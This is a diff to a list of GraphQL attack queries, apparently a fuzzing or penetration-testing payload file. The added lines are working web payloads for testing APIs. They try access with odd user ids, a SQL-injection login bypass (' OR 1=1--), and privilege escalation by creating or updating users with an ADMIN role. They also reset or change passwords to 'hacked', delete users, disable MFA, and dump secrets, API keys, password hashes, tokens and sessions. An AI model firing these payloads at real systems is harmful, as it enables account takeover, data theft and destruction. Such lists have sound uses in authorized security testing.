@@ -1,5 +1,33 @@
-{"query":"{ users { id email password role } }"}
-{"query":"{ me { id email role isAdmin } }"}
-{"query":"{ admin { users { email password } } }"}
-
-{"query":"{ currentUser { id email token } }"}
+{"query":"{user(id:0){name email role}}"}
+{"query":"{user(id:-1){name email role}}"}
+{"query":"{user(id:null){name email role}}"}
+{"query":"{user(id:""){name email role}}"}
+{"query":"{user(id:"admin"){name email role}}"}
+{"query":"{user(id:1,bypass:true){name email role password}}"}
+{"query":"{users{id name email role password}}"}
+{"query":"{allUsers{id name email role password}}"}
+{"query":"{adminUsers{id name email role}}"}
+{"query":"{me{id name email role password secretKey}}"}
+{"query":"mutation{login(username:"admin",password:"' OR 1=1--"){token}}"}
+{"query":"mutation{login(username:"admin\"",password:"test"){token}}"}
+{"query":"mutation{login(username:"admin",password:null){token}}"}
+{"query":"mutation{login(username:"admin",password:""){token}}"}
+{"query":"mutation{register(username:"admin",password:"hacked",role:"admin"){token}}"}
+{"query":"mutation{createUser(input:{username:"admin",role:"ADMIN",password:"hacked"}){id token}}"}
+{"query":"mutation{updateUser(id:1,input:{role:"ADMIN",password:"hacked"}){id role}}"}
+{"query":"mutation{updateUser(id:1,input:{isAdmin:true}){id isAdmin}}"}
+{"query":"mutation{resetPassword(email:"admin@example.com"){success message token}}"}
+{"query":"mutation{changePassword(userId:1,newPassword:"hacked"){success}}"}
+{"query":"mutation{deleteUser(id:1){success}}"}
+{"query":"mutation{disableMFA(userId:1){success}}"}
+{"query":"mutation{generateToken(userId:1,role:"admin"){token}}"}
+{"query":"{config{secretKey apiKey databaseUrl}}"}
+{"query":"{settings{adminPassword debugMode}}"}
+{"query":"{systemInfo{version environment secrets}}"}
+{"query":"{privateData{id content owner}}"}
+{"query":"{internalApi{endpoints secrets}}"}
+{"query":"{debugInfo{environment variables secrets}}"}
+{"query":"{user(username:"admin"){id password passwordHash salt secretQuestionAnswer}}"}
+{"query":"{tokens{accessToken refreshToken}}"}
+{"query":"{sessions{userId token expiresAt}}"}
+{"query":"{apiKeys{key secret userId}}"}
